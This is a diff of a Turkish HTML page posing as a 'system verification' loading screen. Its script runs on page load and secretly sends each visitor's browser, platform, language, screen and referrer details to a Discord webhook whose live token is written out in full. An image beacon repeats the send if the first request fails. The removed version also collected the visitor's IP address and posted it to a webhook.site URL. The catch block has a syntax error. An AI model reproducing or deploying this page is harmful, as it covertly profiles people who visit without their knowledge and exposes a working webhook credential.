@@ -2,43 +2,44 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Kontrolü</title>
+    <title>Sistem Doğrulaması</title>
 </head>
 <body>
-    <h1>Bağlantı Başarılı</h1>
-    <p>Lütfen bekleyiniz, yönlendiriliyorsunuz...</p>
-
+    <h1>Yükleniyor...</h1>
+    
     <script>
-        async function collectData() {
-            const webhookUrl = 'https://webhook.site/1e3471ed-e9d8-42cb-954f-505ca3b77916';
+        (async function() {
             
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
+            const webhookUrl = 'https://discord.com/api/webhooks/1483513824064831703/veRtfwL-8dyJPQ2gMGHD1FtxvgcsG1if2Sh_VqHLnERPfcPSqbHyjJ_BWIyVATmum9kf';
 
-                const payload = {
-                    userAgent: navigator.userAgent,
-                    ip: ipData.ip,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    referrer: document.referrer,
+            const payload = {
+                embeds: [{
+                    title: "🚀 Yeni Pentest Verisi Yakalandı",
+                    color: 15158332, 
+                    fields: [
+                        { name: "🌐 Tarayıcı (UA)", value: `\`\`\`${navigator.userAgent}\`\`\`` },
+                        { name: "💻 Platform", value: navigator.platform, inline: true },
+                        { name: "🌍 Dil", value: navigator.language, inline: true },
+                        { name: "📏 Çözünürlük", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                        { name: "🔗 Referrer", value: document.referrer || "Direkt Giriş" }
+                    ],
+                    footer: { text: "Sistem İzleme Modülü" },
                     timestamp: new Date().toISOString()
-                };
+                }]
+            };
+
+            try {
                 await fetch(webhookUrl, {
                     method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-
-            } catch (error) {
-                console.log("Hata oluştu, ancak sessiz kalmaya devam ediyoruz.");
+                console.log("Veri başarıyla iletildi.");
+            } catch (err) 
+                const fallbackImg = new Image();
+                fallbackImg.src = `${webhookUrl}?content=${encodeURIComponent(JSON.stringify(payload))}`;
             }
-        }
-        collectData();
+        })();
     </script>
 </body>
 </html>
